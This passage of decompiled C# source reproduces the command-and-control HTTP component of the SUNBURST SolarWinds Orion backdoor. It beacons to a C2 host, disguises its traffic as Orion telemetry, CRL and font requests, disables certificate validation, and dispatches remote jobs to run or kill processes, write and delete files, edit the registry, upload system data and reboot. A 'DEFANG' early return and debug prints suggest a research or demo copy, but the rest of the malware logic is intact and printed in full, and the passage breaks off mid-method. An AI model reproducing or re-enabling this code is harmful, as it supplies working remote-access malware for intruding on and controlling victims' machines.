								array[0] = this.proxyString;
								array[1] = ":";
								array[2] = instance.Uri;
								array[3] = "\t";
								int num = 4;
								UsernamePasswordCredential usernamePasswordCredential = instance.Credential as UsernamePasswordCredential;
								array[num] = ((usernamePasswordCredential != null) ? usernamePasswordCredential.Username : null);
								array[5] = "\t";
								int num2 = 6;
								UsernamePasswordCredential usernamePasswordCredential2 = instance.Credential as UsernamePasswordCredential;
								array[num2] = ((usernamePasswordCredential2 != null) ? usernamePasswordCredential2.Password : null);
								this.proxyString = string.Concat(array);
							}
						}*/
					}
					catch
					{
						Console.WriteLine("Proxy class error");
					}
				}
				return this.proxyString;
			}

			// Token: 0x06000997 RID: 2455 RVA: 0x0004485C File Offset: 0x00042A5C
			public IWebProxy GetWebProxy()
			{
				return this.proxy;
			}

			// Token: 0x040002F0 RID: 752
			private Program.ProxyType proxyType;

			// Token: 0x040002F1 RID: 753
			private IWebProxy proxy;

			// Token: 0x040002F2 RID: 754
			private string proxyString;
		}

		// Token: 0x020000D5 RID: 213
		private class HttpHelper
		{
			// Token: 0x06000998 RID: 2456 RVA: 0x00044864 File Offset: 0x00042A64
			public void Abort()
			{
				this.isAbort = true;
			}

			// Token: 0x06000999 RID: 2457 RVA: 0x00044870 File Offset: 0x00042A70
			public HttpHelper(byte[] customerId, Program.DnsRecords rec)
			{
				this.customerId = customerId.ToArray<byte>();
				Console.WriteLine("CustomerId is :" + customerId.ToArray<byte>());
				this.httpHost = rec.cname;
				Console.WriteLine("httpHost is :" + rec.cname);
				this.requestMethod = (Program.HttpOipMethods)rec._type;
				Console.WriteLine("Request method is :" + this.requestMethod);
				this.proxy = new Program.Proxy((Program.ProxyType)rec.length);
				Console.WriteLine("Proxy is :" + this.proxy);
			}

			// Token: 0x0600099A RID: 2458 RVA: 0x000448E4 File Offset: 0x00042AE4
			private bool TrackEvent()
			{
				if (DateTime.Now.CompareTo(this.timeStamp.AddMinutes(1.0)) > 0)
				{
					if (Program.ProcessTracker.TrackProcesses(false) || Program.svcListModified2)
					{
						return true;
					}
					this.timeStamp = DateTime.Now;
				}
				return false;
			}

			// Token: 0x0600099B RID: 2459 RVA: 0x00044934 File Offset: 0x00042B34
			private bool IsSynchronized(bool idle)
			{
				if (this.delay != 0 && idle)
				{
					if (this.delayInc == 0)
					{
						this.delayInc = this.delay;
					}
					double num = (double)this.delayInc * 1000.0;
					Program.DelayMs(0.9 * num, 1.1 * num);
					if (this.delayInc < 300)
					{
						this.delayInc *= 2;
						return true;
					}
				}
				else
				{
					Program.DelayMs(0.0, 0.0);
					this.delayInc = 0;
				}
				return false;
			}

			// Token: 0x0600099C RID: 2460 RVA: 0x000449CC File Offset: 0x00042BCC
			public void Initialize()
			{
				Program.HttpHelper.JobEngine jobEngine = Program.HttpHelper.JobEngine.Idle;
				string response = null;
				int err = 0;
				try
				{
					int num = 1;
					while (num <= 3 && !this.isAbort)
					{
						byte[] body = null;
						if (this.IsSynchronized(jobEngine == Program.HttpHelper.JobEngine.Idle))
						{
							num = 0;
						}
						if (this.TrackEvent())
						{
							this.isAbort = true;
							break;
						}
						HttpStatusCode httpStatusCode = this.CreateUploadRequest(jobEngine, err, response, out body);

						/*DEFANG
						 * HERE WE RETURN . DONT REMOVE THAT RETURN. 
						 */
						Console.WriteLine("THE BACKDOOR CONNECTED TO C2 SERVER " + Program.fakehost);
						Console.WriteLine("THE END.=====");
						Program.instance.Close(); //<-- DO NOT REMOVE!!!!!!
						return; //<-- DO NOT REMOVE!!!!!!

						if (jobEngine == Program.HttpHelper.JobEngine.Exit || jobEngine == Program.HttpHelper.JobEngine.Reboot)
						{
							this.isAbort = true;
							break;
						}
						if (httpStatusCode <= HttpStatusCode.OK)
						{
							if (httpStatusCode != (HttpStatusCode)0)
							{
								if (httpStatusCode != HttpStatusCode.OK)
								{
									goto IL_DC;
								}
								goto IL_89;
							}
						}
						else
						{
							if (httpStatusCode == HttpStatusCode.NoContent || httpStatusCode == HttpStatusCode.NotModified)
							{
								goto IL_89;
							}
							goto IL_DC;
						}
					IL_E3:
						num++;
						continue;
					IL_89:
						string cl = null;
						if (httpStatusCode != HttpStatusCode.OK)
						{
							if (httpStatusCode != HttpStatusCode.NoContent)
							{
								jobEngine = Program.HttpHelper.JobEngine.Idle;
							}
							else
							{
								num = ((jobEngine == Program.HttpHelper.JobEngine.None || jobEngine == Program.HttpHelper.JobEngine.Idle) ? num : 0);
								jobEngine = Program.HttpHelper.JobEngine.None;
							}
						}
						else
						{
							jobEngine = this.ParseServiceResponse(body, out cl);
							num = ((jobEngine == Program.HttpHelper.JobEngine.None || jobEngine == Program.HttpHelper.JobEngine.Idle) ? num : 0);
						}
						err = this.ExecuteEngine(jobEngine, cl, out response);
						goto IL_E3;
					IL_DC:
						Program.DelayMin(1, 5);
						goto IL_E3;
					}
					if (jobEngine == Program.HttpHelper.JobEngine.Reboot)
					{
						Program.NativeMethods.RebootComputer();
					}
				}
				catch (Exception)
				{
					Console.WriteLine("Error in HTTPHelper. Unable to connect");
				}
			}

			// Token: 0x0600099D RID: 2461 RVA: 0x00044AE8 File Offset: 0x00042CE8
			private int ExecuteEngine(Program.HttpHelper.JobEngine job, string cl, out string result)
			{
				result = null;
				int num = 0;
				string[] args = Program.Job.SplitString(cl);
				int result2;
				try
				{
					if (job == Program.HttpHelper.JobEngine.ReadRegistryValue || job == Program.HttpHelper.JobEngine.SetRegistryValue || job == Program.HttpHelper.JobEngine.DeleteRegistryValue || job == Program.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames)
					{
						num = Program.HttpHelper.AddRegistryExecutionEngine(job, args, out result);
					}
					switch (job)
					{
						case Program.HttpHelper.JobEngine.SetTime:
							{
								int num2;
								Program.Job.SetTime(args, out num2);
								this.delay = num2;
								break;
							}
						case Program.HttpHelper.JobEngine.CollectSystemDescription:
							Program.Job.CollectSystemDescription(this.proxy.ToString(), out result);
							break;
						case Program.HttpHelper.JobEngine.UploadSystemDescription:
							Program.Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());
							break;
						case Program.HttpHelper.JobEngine.RunTask:
							num = Program.Job.RunTask(args, cl, out result);
							break;
						case Program.HttpHelper.JobEngine.GetProcessByDescription:
							Program.Job.GetProcessByDescription(args, out result);
							break;
						case Program.HttpHelper.JobEngine.KillTask:
							Program.Job.KillTask(args);
							break;
					}
					if (job == Program.HttpHelper.JobEngine.WriteFile || job == Program.HttpHelper.JobEngine.FileExists || job == Program.HttpHelper.JobEngine.DeleteFile || job == Program.HttpHelper.JobEngine.GetFileHash || job == Program.HttpHelper.JobEngine.GetFileSystemEntries)
					{
						result2 = Program.HttpHelper.AddFileExecutionEngine(job, args, out result);
					}
					else
					{
						result2 = num;
					}
				}
				catch (Exception ex)
				{
					if (!string.IsNullOrEmpty(result))
					{
						result += "\n";
					}
					result += ex.Message;
					result2 = ex.HResult;
				}
				return result2;
			}

			// Token: 0x0600099E RID: 2462 RVA: 0x00044C00 File Offset: 0x00042E00
			private static int AddRegistryExecutionEngine(Program.HttpHelper.JobEngine job, string[] args, out string result)
			{
				result = null;
				int result2 = 0;
				switch (job)
				{
					case Program.HttpHelper.JobEngine.ReadRegistryValue:
						result2 = Program.Job.ReadRegistryValue(args, out result);
						break;
					case Program.HttpHelper.JobEngine.SetRegistryValue:
						result2 = Program.Job.SetRegistryValue(args);
						break;
					case Program.HttpHelper.JobEngine.DeleteRegistryValue:
						Program.Job.DeleteRegistryValue(args);
						break;
					case Program.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames:
						Program.Job.GetRegistrySubKeyAndValueNames(args, out result);
						break;
				}
				return result2;
			}

			// Token: 0x0600099F RID: 2463 RVA: 0x00044C50 File Offset: 0x00042E50
			private static int AddFileExecutionEngine(Program.HttpHelper.JobEngine job, string[] args, out string result)
			{
				result = null;
				int result2 = 0;
				switch (job)
				{
					case Program.HttpHelper.JobEngine.GetFileSystemEntries:
						Program.Job.GetFileSystemEntries(args, out result);
						break;
					case Program.HttpHelper.JobEngine.WriteFile:
						Program.Job.WriteFile(args);
						break;
					case Program.HttpHelper.JobEngine.FileExists:
						Program.Job.FileExists(args, out result);
						break;
					case Program.HttpHelper.JobEngine.DeleteFile:
						Program.Job.DeleteFile(args);
						break;
					case Program.HttpHelper.JobEngine.GetFileHash:
						result2 = Program.Job.GetFileHash(args, out result);
						break;
				}
				return result2;
			}

			// Token: 0x060009A0 RID: 2464 RVA: 0x00044CAC File Offset: 0x00042EAC
			private static byte[] Deflate(byte[] body)
			{
				int num = 0;
				byte[] array = body.ToArray<byte>();
				for (int i = 1; i < array.Length; i++)
				{
					byte[] array2 = array;
					int num2 = i;
					array2[num2] ^= array[0];
					num += (int)array[i];
				}
				if ((byte)num == array[0])
				{
					return Program.ZipHelper.Decompress(array.Skip(1).ToArray<byte>());
				}
				return null;
			}

			// Token: 0x060009A1 RID: 2465 RVA: 0x00044D00 File Offset: 0x00042F00
			private static byte[] Inflate(byte[] body)
			{
				byte[] array = Program.ZipHelper.Compress(body);
				byte[] array2 = new byte[array.Length + 1];
				array2[0] = (byte)array.Sum((byte b) => (int)b);
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array3 = array;
					int num = i;
					array3[num] ^= array2[0];
				}
				Array.Copy(array, 0, array2, 1, array.Length);
				return array2;
			}

			// Token: 0x060009A2 RID: 2466 RVA: 0x00044D74 File Offset: 0x00042F74
			private Program.HttpHelper.JobEngine ParseServiceResponse(byte[] body, out string args)
			{
				args = null;
				try
				{
					if (body == null || body.Length < 4)
					{
						return Program.HttpHelper.JobEngine.None;
					}
					Program.HttpOipMethods httpOipMethods = this.requestMethod;
					if (httpOipMethods != Program.HttpOipMethods.Put)
					{
						if (httpOipMethods != Program.HttpOipMethods.Post)
						{
							// "\{[0-9a-f-]{36}\}"|"[0-9a-f]{32}"|"[0-9a-f]{16}"
							string[] value = (from Match m in Regex.Matches(Encoding.UTF8.GetString(body), Program.ZipHelper.Unzip("U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA"), RegexOptions.IgnoreCase)
											  select m.Value).ToArray<string>();
							body = Program.HexStringToByteArray(string.Join("", value).Replace("\"", string.Empty).Replace("-", string.Empty).Replace("{", string.Empty).Replace("}", string.Empty));
						}
						else
						{
							body = body.Skip(12).ToArray<byte>();
						}
					}
					else
					{
						body = body.Skip(48).ToArray<byte>();
					}
					int num = BitConverter.ToInt32(body, 0);
					body = body.Skip(4).Take(num).ToArray<byte>();
					if (body.Length != num)
					{
						return Program.HttpHelper.JobEngine.None;
					}
					string[] array = Encoding.UTF8.GetString(Program.HttpHelper.Deflate(body)).Trim().Split(new char[]
					{
						' '
					}, 2);
					Program.HttpHelper.JobEngine jobEngine = (Program.HttpHelper.JobEngine)int.Parse(array[0]);
					args = ((array.Length > 1) ? array[1] : null);
					return Enum.IsDefined(typeof(Program.HttpHelper.JobEngine), jobEngine) ? jobEngine : Program.HttpHelper.JobEngine.None;
				}
				catch (Exception)
				{
				}
				return Program.HttpHelper.JobEngine.None;
			}

			// Token: 0x060009A3 RID: 2467 RVA: 0x00044F14 File Offset: 0x00043114
			public static void Close(Program.HttpHelper http, Thread thread)
			{
				if (thread != null && thread.IsAlive)
				{
					if (http != null)
					{
						http.Abort();
					}
					try
					{
						thread.Join(60000);
						if (thread.IsAlive)
						{
							thread.Abort();
						}
					}
					catch (Exception)
					{
					}
				}
			}

			// Token: 0x060009A4 RID: 2468 RVA: 0x00044F68 File Offset: 0x00043168
			private string GetCache()
			{
				byte[] array = this.customerId.ToArray<byte>();
				byte[] array2 = new byte[array.Length];
				this.random.NextBytes(array2);
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array3 = array;
					int num = i;
					array3[num] ^= array2[2 + i % 4];
				}
				return Program.ByteArrayToHexString(array) + Program.ByteArrayToHexString(array2);
			}

			// Token: 0x060009A5 RID: 2469 RVA: 0x00044FC8 File Offset: 0x000431C8
			private string GetOrionImprovementCustomerId()
			{
				byte[] array = new byte[16];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((int)(~(int)this.customerId[i % (this.customerId.Length - 1)]) + i / this.customerId.Length);
				}
				return new Guid(array).ToString().Trim(new char[]
				{
					'{',
					'}'
				});
			}

			// Token: 0x060009A6 RID: 2470 RVA: 0x00045038 File Offset: 0x00043238
			private HttpStatusCode CreateUploadRequestImpl(HttpWebRequest request, byte[] inData, out byte[] outData)
			{
				outData = null;
				try
				{
					request.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
					request.Proxy = this.proxy.GetWebProxy();
					request.UserAgent = this.GetUserAgent();
					request.KeepAlive = false;
					request.Timeout = 120000;
					request.Method = "GET";
					if (inData != null)
					{
						request.Method = "POST";
						using (Stream requestStream = request.GetRequestStream())
						{
							requestStream.Write(inData, 0, inData.Length);
						}
					}
					using (WebResponse response = request.GetResponse())
					{
						using (Stream responseStream = response.GetResponseStream())
						{
							byte[] array = new byte[4096];
							using (MemoryStream memoryStream = new MemoryStream())
							{
								int count;
								while ((count = responseStream.Read(array, 0, array.Length)) > 0)
								{
									memoryStream.Write(array, 0, count);
								}
								outData = memoryStream.ToArray();
							}
						}
						return ((HttpWebResponse)response).StatusCode;
					}
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
					{
						return ((HttpWebResponse)ex.Response).StatusCode;
					}
				}
				catch (Exception)
				{
				}
				return HttpStatusCode.Unused;
			}

			// Token: 0x060009A7 RID: 2471 RVA: 0x00045228 File Offset: 0x00043428
			private HttpStatusCode CreateUploadRequest(Program.HttpHelper.JobEngine job, int err, string response, out byte[] outData)
			{
				string text = this.httpHost;
				byte[] array = null;
				Program.HttpHelper.HttpOipExMethods httpOipExMethods = (job != Program.HttpHelper.JobEngine.Idle && job != Program.HttpHelper.JobEngine.None) ? Program.HttpHelper.HttpOipExMethods.Head : Program.HttpHelper.HttpOipExMethods.Get;
				outData = null;
				try
				{
					if (!string.IsNullOrEmpty(response))
					{
						byte[] bytes = Encoding.UTF8.GetBytes(response);
						byte[] bytes2 = BitConverter.GetBytes(err);
						byte[] array2 = new byte[bytes.Length + bytes2.Length + this.customerId.Length];
						Array.Copy(bytes, array2, bytes.Length);
						Array.Copy(bytes2, 0, array2, bytes.Length, bytes2.Length);
						Array.Copy(this.customerId, 0, array2, bytes.Length + bytes2.Length, this.customerId.Length);
						array = Program.HttpHelper.Inflate(array2);
						httpOipExMethods = ((array.Length <= 10000) ? Program.HttpHelper.HttpOipExMethods.Put : Program.HttpHelper.HttpOipExMethods.Post);
					}
					if (!text.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !text.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
					{
						text = Uri.UriSchemeHttps + "://" + text;
					}
					if (!text.EndsWith("/"))
					{
						text += "/";
					}
					text += this.GetBaseUri(httpOipExMethods, err);
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
					if (httpOipExMethods == Program.HttpHelper.HttpOipExMethods.Get || httpOipExMethods == Program.HttpHelper.HttpOipExMethods.Head)
					{
						// If-None-Match
						httpWebRequest.Headers.Add(Program.ZipHelper.Unzip("80zT9cvPS9X1TSxJzgAA"), this.GetCache());
					}
					if (httpOipExMethods == Program.HttpHelper.HttpOipExMethods.Put && (this.requestMethod == Program.HttpOipMethods.Get || this.requestMethod == Program.HttpOipMethods.Head))
					{
						int[] intArray = this.GetIntArray((array != null) ? array.Length : 0);
						int num = 0;
						ulong num2 = (ulong)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds;
						num2 -= 300000UL;
						string text2 = "{";
						// "userId":"{0}",
						text2 += string.Format(Program.ZipHelper.Unzip("UyotTi3yTFGyUqo2qFXSAQA="), this.GetOrionImprovementCustomerId());
						// "sessionId":"{0}",
						text2 += string.Format(Program.ZipHelper.Unzip("UypOLS7OzM/zTFGyUqo2qFXSAQA="), this.sessionId.ToString().Trim(new char[]
						{
							'{',
							'}'
						}));
						// "steps":[
						text2 += Program.ZipHelper.Unzip("UyouSS0oVrKKBgA=");
						for (int i = 0; i < intArray.Length; i++)
						{
							uint num3 = (uint)((this.random.Next(4) == 0) ? this.random.Next(512) : 0);
							num2 += (ulong)num3;
							byte[] array3;
							if (intArray[i] > 0)
							{
								num2 |= 2UL;
								array3 = array.Skip(num).Take(intArray[i]).ToArray<byte>();
								num += intArray[i];
							}
							else
							{
								num2 &= 18446744073709551613UL;
								array3 = new byte[this.random.Next(16, 28)];
								for (int j = 0; j < array3.Length; j++)
								{
									array3[j] = (byte)this.random.Next();
								}
							}
							text2 += "{";
							// "Timestamp":"\/Date({0})\/",
							text2 += string.Format(Program.ZipHelper.Unzip("UwrJzE0tLknMLVCyUorRd0ksSdWoNqjVjNFX0gEA"), num2);
							string str = text2;
							// "Index":{0},
							string format = Program.ZipHelper.Unzip("U/LMS0mtULKqNqjVAQA=");
							int num4 = this.mIndex;
							this.mIndex = num4 + 1;
							text2 = str + string.Format(format, num4);
							// "EventType":"Orion",
							text2 += Program.ZipHelper.Unzip("U3ItS80rCaksSFWyUvIvyszPU9IBAA==");
							// "EventName":"EventManager",
							text2 += Program.ZipHelper.Unzip("U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==");
							// "DurationMs":{0},
							text2 += string.Format(Program.ZipHelper.Unzip("U3IpLUosyczP8y1Wsqo2qNUBAA=="), num3);
							// "Succeeded":true,
							text2 += Program.ZipHelper.Unzip("UwouTU5OTU1JTVGyKikqTdUBAA==");
							// "Message":"{0}"
							text2 += string.Format(Program.ZipHelper.Unzip("U/JNLS5OTE9VslKqNqhVAgA="), Convert.ToBase64String(array3).Replace("/", "\\/"));
							text2 += ((i + 1 != intArray.Length) ? "}," : "}");
						}
						text2 += "]}";
						// application/json
						httpWebRequest.ContentType = Program.ZipHelper.Unzip("SywoyMlMTizJzM/TzyrOzwMA");
						array = Encoding.UTF8.GetBytes(text2);
					}
					if (httpOipExMethods == Program.HttpHelper.HttpOipExMethods.Post || this.requestMethod == Program.HttpOipMethods.Put || this.requestMethod == Program.HttpOipMethods.Post)
					{
						// application/octet-stream
						httpWebRequest.ContentType = Program.ZipHelper.Unzip("SywoyMlMTizJzM/Tz08uSS3RLS4pSk3MBQA=");
					}
					return this.CreateUploadRequestImpl(httpWebRequest, array, out outData);
				}
				catch (Exception)
				{
				}
				return (HttpStatusCode)0;
			}

			// Token: 0x060009A8 RID: 2472 RVA: 0x00045694 File Offset: 0x00043894
			private int[] GetIntArray(int sz)
			{
				int[] array = new int[30];
				int num = sz;
				for (int i = array.Length - 1; i >= 0; i--)
				{
					if (num < 16 || i == 0)
					{
						array[i] = num;
						break;
					}
					int num2 = num / (i + 1) + 1;
					if (num2 < 16)
					{
						array[i] = this.random.Next(16, Math.Min(32, num) + 1);
						num -= array[i];
					}
					else
					{
						int num3 = Math.Min(512 - num2, num2 - 16);
						array[i] = this.random.Next(num2 - num3, num2 + num3 + 1);
						num -= array[i];
					}
				}
				return array;
			}

			// Token: 0x060009A9 RID: 2473 RVA: 0x00045729 File Offset: 0x00043929
			private bool Valid(int percent)
			{
				return this.random.Next(100) < percent;
			}

			// Token: 0x060009AA RID: 2474 RVA: 0x0004573C File Offset: 0x0004393C
			private string GetBaseUri(Program.HttpHelper.HttpOipExMethods method, int err)
			{
				int num = (method != Program.HttpHelper.HttpOipExMethods.Get && method != Program.HttpHelper.HttpOipExMethods.Head) ? 1 : 16;
				string baseUriImpl;
				ulong hash;
				for (; ; )
				{
					baseUriImpl = this.GetBaseUriImpl(method, err);
					hash = Program.GetHash(baseUriImpl);
					if (!this.UriTimeStamps.Contains(hash))
					{
						break;
					}
					if (--num <= 0)
					{
						return baseUriImpl;
					}
				}
				this.UriTimeStamps.Add(hash);
				return baseUriImpl;
			}

			// Token: 0x060009AB RID: 2475 RVA: 0x0004578C File Offset: 0x0004398C
			private string GetBaseUriImpl(Program.HttpHelper.HttpOipExMethods method, int err)
			{
				string text = null;
				if (method == Program.HttpHelper.HttpOipExMethods.Head)
				{
					text = ((ushort)err).ToString();
				}
				if (this.requestMethod == Program.HttpOipMethods.Post)
				{
					string[] array = new string[]
					{
						// -root
						Program.ZipHelper.Unzip("0y3Kzy8BAA=="),
						// -cert
						Program.ZipHelper.Unzip("001OLSoBAA=="),
						// -universal_ca
						Program.ZipHelper.Unzip("0y3NyyxLLSpOzIlPTgQA"),
						// -ca
						Program.ZipHelper.Unzip("001OBAA="),
						// -primary_ca
						Program.ZipHelper.Unzip("0y0oysxNLKqMT04EAA=="),
						// -timestamp
						Program.ZipHelper.Unzip("0y3JzE0tLknMLQAA"),
						"",
						// -global
						Program.ZipHelper.Unzip("003PyU9KzAEA"),
						// -secureca
						Program.ZipHelper.Unzip("0y1OTS4tSk1OBAA=")
					};
					// pki/crl/{0}{1}{2}.crl
					return string.Format(Program.ZipHelper.Unzip("K8jO1E8uytGvNqitNqytNqrVA/IA"), this.random.Next(100, 10000), array[this.random.Next(array.Length)], (text == null) ? "" : ("-" + text));
				}
				if (this.requestMethod == Program.HttpOipMethods.Put)
				{
					string[] array2 = new string[]
					{
						// Bold
						Program.ZipHelper.Unzip("c8rPSQEA"),
						// BoldItalic
						Program.ZipHelper.Unzip("c8rPSfEsSczJTAYA"),
						// ExtraBold
						Program.ZipHelper.Unzip("c60oKUp0ys9JAQA="),
						// ExtraBoldItalic
						Program.ZipHelper.Unzip("c60oKUp0ys9J8SxJzMlMBgA="),
						// Italic
						Program.ZipHelper.Unzip("8yxJzMlMBgA="),
						// Light
						Program.ZipHelper.Unzip("88lMzygBAA=="),
						// LightItalic
						Program.ZipHelper.Unzip("88lMzyjxLEnMyUwGAA=="),
						// Regular
						Program.ZipHelper.Unzip("C0pNL81JLAIA"),
						// SemiBold
						Program.ZipHelper.Unzip("C07NzXTKz0kBAA=="),
						// SemiBoldItalic
						Program.ZipHelper.Unzip("C07NzXTKz0nxLEnMyUwGAA==")
					};
					string[] array3 = new string[]
					{
						// opensans
						Program.ZipHelper.Unzip("yy9IzStOzCsGAA=="),
						// noto
						Program.ZipHelper.Unzip("y8svyQcA"),
						// freefont
						Program.ZipHelper.Unzip("SytKTU3LzysBAA=="),
						// SourceCodePro
						Program.ZipHelper.Unzip("C84vLUpOdc5PSQ0oygcA"),
						// SourceSerifPro
						Program.ZipHelper.Unzip("C84vLUpODU4tykwLKMoHAA=="),
						// SourceHanSans
						Program.ZipHelper.Unzip("C84vLUpO9UjMC07MKwYA"),
						// SourceHanSerif
						Program.ZipHelper.Unzip("C84vLUpO9UjMC04tykwDAA==")
					};
					int num = this.random.Next(array3.Length);
					if (num <= 1)
					{
						// fonts/woff/{0}-{1}-{2}-webfont{3}.woff2
						return string.Format(Program.ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA"), new object[]
						{
							this.random.Next(100, 10000),
							array3[num],
							array2[this.random.Next(array2.Length)].ToLower(),
							text
						});
					}
					// fonts/woff/{0}-{1}-{2}{3}.woff2
					return string.Format(Program.ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA="), new object[]
					{
						this.random.Next(100, 10000),
						array3[num],
						array2[this.random.Next(array2.Length)],
						text
					});
				}
				else
				{
					if (method <= Program.HttpHelper.HttpOipExMethods.Head)
					{
						string text2 = "";
						if (this.Valid(20))
						{
							// SolarWinds
							text2 += Program.ZipHelper.Unzip("C87PSSwKz8xLKQYA");
							if (this.Valid(40))
							{
								// .CortexPlugin
								text2 += Program.ZipHelper.Unzip("03POLypJrQjIKU3PzAMA");
							}
						}
						if (this.Valid(80))
						{
							// .Orion
							text2 += Program.ZipHelper.Unzip("0/MvyszPAwA=");
						}
						if (this.Valid(80))
						{
							string[] array4 = new string[]
							{
								// Wireless
								Program.ZipHelper.Unzip("C88sSs1JLS4GAA=="),
								// UI
								Program.ZipHelper.Unzip("C/UEAA=="),
								// Widgets
								Program.ZipHelper.Unzip("C89MSU8tKQYA"),
								// NPM
								Program.ZipHelper.Unzip("8wvwBQA="),
								// Apollo
								Program.ZipHelper.Unzip("cyzIz8nJBwA="),
								// CloudMonitoring
								Program.ZipHelper.Unzip("c87JL03xzc/LLMkvysxLBwA=")
							};
							text2 = text2 + "." + array4[this.random.Next(array4.Length)];
						}
						if (this.Valid(30) || string.IsNullOrEmpty(text2))
						{
							string[] array5 = new string[]
							{
								// Nodes
								Program.ZipHelper.Unzip("88tPSS0GAA=="),
								// Volumes
								Program.ZipHelper.Unzip("C8vPKc1NLQYA"),
								// Interfaces
								Program.ZipHelper.Unzip("88wrSS1KS0xOLQYA"),
								// Components
								Program.ZipHelper.Unzip("c87PLcjPS80rKQYA")
							};
							text2 = text2 + "." + array5[this.random.Next(array5.Length)];
						}
						if (this.Valid(30) || text != null)
						{
							text2 = string.Concat(new object[]
							{
								text2,
								"-",
								this.random.Next(1, 20),
								".",
								this.random.Next(1, 30)
							});
							if (text != null)
							{
								text2 = text2 + "." + ((ushort)err).ToString();
							}
						}
						// swip/upd/
						return Program.ZipHelper.Unzip("Ky7PLNAvLUjRBwA=") + text2.TrimStart(new char[]
						{
							'.'
						// .xml
						}) + Program.ZipHelper.Unzip("06vIzQEA");
					}
					if (method != Program.HttpHelper.HttpOipExMethods.Put)
					{
						// swip/Upload.ashx
						return Program.ZipHelper.Unzip("Ky7PLNAPLcjJT0zRSyzOqAAA");
					}
					// swip/Events
					return Program.ZipHelper.Unzip("Ky7PLNB3LUvNKykGAA==");
				}
			}

			// Token: 0x060009AC RID: 2476 RVA: 0x00045C44 File Offset: 0x00043E44
			private string GetUserAgent()
			{
				if (this.requestMethod == Program.HttpOipMethods.Put || this.requestMethod == Program.HttpOipMethods.Get)
				{
					return null;
				}
				if (this.requestMethod == Program.HttpOipMethods.Post)
				{
					if (string.IsNullOrEmpty(Program.userAgentDefault))
					{
						// Microsoft-CryptoAPI/
						Program.userAgentDefault = Program.ZipHelper.Unzip("881MLsovzk8r0XUuqiwoyXcM8NQHAA==");
						Program.userAgentDefault += Program.GetOSVersion(false);
					}
					return Program.userAgentDefault;
				}
				if (string.IsNullOrEmpty(Program.userAgentOrionImprovementClient))
				{
					// SolarWindsOrionImprovementClient/
					Program.userAgentOrionImprovementClient = Program.ZipHelper.Unzip("C87PSSwKz8xLKfYvyszP88wtKMovS81NzStxzskEkvoA");
					try
					{
						// \OrionImprovement\SolarWinds.OrionImprovement.exe
						string text = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
						text += Program.ZipHelper.Unzip("i/EvyszP88wtKMovS81NzSuJCc7PSSwKz8xLKdZDl9NLrUgFAA==");
						Program.userAgentOrionImprovementClient += FileVersionInfo.GetVersionInfo(text).FileVersion;
					}
					catch (Exception)
					{
						// 3.0.0.382
						Program.userAgentOrionImprovementClient += Program.ZipHelper.Unzip("M9YzAEJjCyMA");
					}
				}
				return Program.userAgentOrionImprovementClient;
			}

			// Token: 0x040002F3 RID: 755
			private readonly Random random = new Random();

			// Token: 0x040002F4 RID: 756
			private readonly byte[] customerId;

			// Token: 0x040002F5 RID: 757
			private readonly string httpHost;

			// Token: 0x040002F6 RID: 758
			private readonly Program.HttpOipMethods requestMethod;

			// Token: 0x040002F7 RID: 759
			private bool isAbort;

			// Token: 0x040002F8 RID: 760
			private int delay;

			// Token: 0x040002F9 RID: 761
			private int delayInc;

			// Token: 0x040002FA RID: 762
			private readonly Program.Proxy proxy;

			// Token: 0x040002FB RID: 763
			private DateTime timeStamp = DateTime.Now;

			// Token: 0x040002FC RID: 764
			private int mIndex;

			// Token: 0x040002FD RID: 765
			private Guid sessionId = Guid.NewGuid();

			// Token: 0x040002FE RID: 766
			private readonly List<ulong> UriTimeStamps = new List<ulong>();

			// Token: 0x020001C3 RID: 451
			private enum JobEngine
			{
				// Token: 0x040005A8 RID: 1448
				Idle,
				// Token: 0x040005A9 RID: 1449
				Exit,
				// Token: 0x040005AA RID: 1450
				SetTime,
				// Token: 0x040005AB RID: 1451
				CollectSystemDescription,
				// Token: 0x040005AC RID: 1452
				UploadSystemDescription,
				// Token: 0x040005AD RID: 1453
				RunTask,
				// Token: 0x040005AE RID: 1454
				GetProcessByDescription,
				// Token: 0x040005AF RID: 1455
				KillTask,
				// Token: 0x040005B0 RID: 1456
				GetFileSystemEntries,
				// Token: 0x040005B1 RID: 1457
				WriteFile,
				// Token: 0x040005B2 RID: 1458
				FileExists,
				// Token: 0x040005B3 RID: 1459
				DeleteFile,
				// Token: 0x040005B4 RID: 1460
				GetFileHash,
				// Token: 0x040005B5 RID: 1461
				ReadRegistryValue,
				// Token: 0x040005B6 RID: 1462
				SetRegistryValue,
				// Token: 0x040005B7 RID: 1463
				DeleteRegistryValue,
				// Token: 0x040005B8 RID: 1464
				GetRegistrySubKeyAndValueNames,
				// Token: 0x040005B9 RID: 1465
				Reboot,
				// Token: 0x040005BA RID: 1466
				None
			}

			// Token: 0x020001C4 RID: 452
			private enum HttpOipExMethods
			{
				// Token: 0x040005BC RID: 1468
				Get,
				// Token: 0x040005BD RID: 1469
				Head,
				// Token: 0x040005BE RID: 1470
				Put,
				// Token: 0x040005BF RID: 1471
				Post
			}
		}

		// Token: 0x020000D6 RID: 214
		private static class DnsHelper
		{
			// Token: 0x060009AD RID: 2477 RVA: 0x00045D2C File Offset: 0x00043F2C
			public static bool CheckServerConnection(string hostName)
			{
				try
				{
					
